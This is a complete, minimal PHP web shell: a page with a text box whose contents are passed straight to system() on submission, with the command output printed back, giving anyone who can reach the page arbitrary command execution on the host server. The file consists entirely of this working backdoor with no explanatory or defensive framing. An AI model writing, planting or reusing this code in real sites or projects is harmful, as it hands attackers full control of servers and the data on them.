<pre><?php 

if(isset($_POST['cmd']))
	echo system($_POST['cmd']);

?>
</pre>
<form action="" method="post">
	<textarea name="cmd" style="width:500px; height:200px"><?php echo @$_POST['cmd']?></textarea>
	<br  />
	<input type="submit" value="Submit"/>
</form>